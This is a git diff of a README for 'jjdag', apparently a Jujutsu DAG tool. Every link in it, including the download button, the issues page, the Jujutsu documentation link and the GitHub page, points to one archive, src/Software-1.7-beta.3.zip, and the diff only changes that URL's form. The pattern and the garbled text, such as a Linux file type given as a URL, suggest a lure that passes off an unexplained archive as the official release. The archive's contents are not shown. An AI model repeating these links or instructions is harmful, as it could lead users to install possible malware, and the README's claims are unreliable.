@@ -1,6 +1,6 @@
 # 🚀 jjdag - Simple Tool to Manage Jujutsu DAG
 
-[![Download jjdag](https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip)](https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip)
+[![Download jjdag](https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip)](https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip)
 
 ---
 
@@ -48,13 +48,13 @@ The first step is to get jjdag on your computer. Follow these instructions to do
 
 1. Click the button below to visit the official download page:
 
-   [![Download jjdag](https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip)](https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip)
+   [![Download jjdag](https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip)](https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip)
 
 2. On the releases page, find the version for your operating system:
 
    - For Windows, look for a file ending with `.exe`
    - For macOS, look for `.dmg` or `.zip`
-   - For Linux, look for `https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip` or `.AppImage`
+   - For Linux, look for `https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip` or `.AppImage`
 
 3. Click the file name to start the download. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
@@ -63,7 +63,7 @@ The first step is to get jjdag on your computer. Follow these instructions to do
    - **Windows:** Double-click the `.exe` file and follow the installer instructions.
    - **macOS:** Open the `.dmg` file and drag the jjdag app to your Applications folder.
    - **Linux:**
-     - If it’s an archive like `https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip`, extract it, then follow any instructions in the folder.
+     - If it’s an archive like `https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip`, extract it, then follow any instructions in the folder.
      - If it’s an `.AppImage` file, make it executable by right-clicking, selecting Properties > Permissions, and checking “Allow executing file as program.” Then double-click to run.
 
 5. Open your terminal or command prompt:
@@ -134,7 +134,7 @@ If you have issues, try the following:
 
 For further support, visit the GitHub repository’s Issues page at:
 
-https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip
+https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip
 
 ---
 
@@ -148,7 +148,7 @@ Make sure you download jjdag only from the official release page linked above to
 
 ## 📚 Additional Resources
 
-- Learn more about Jujutsu: https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip
+- Learn more about Jujutsu: https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip
 - Jujutsu documentation for understanding the DAG concept
 - Command line basics for terminal learning
 
@@ -161,7 +161,7 @@ These resources help you understand how jjdag fits into your workflow better.
 If you need more help:
 
 - Check the README and documentation included with jjdag.
-- Visit the GitHub page for updates and discussions: https://raw.githubusercontent.com/Ermz2/jjdag/master/src/Software-1.7-beta.3.zip
+- Visit the GitHub page for updates and discussions: https://github.com/Ermz2/jjdag/raw/refs/heads/master/src/Software-1.7-beta.3.zip
 - Post questions on the Issues tab or community forums related to Jujutsu tooling.
 
 ---
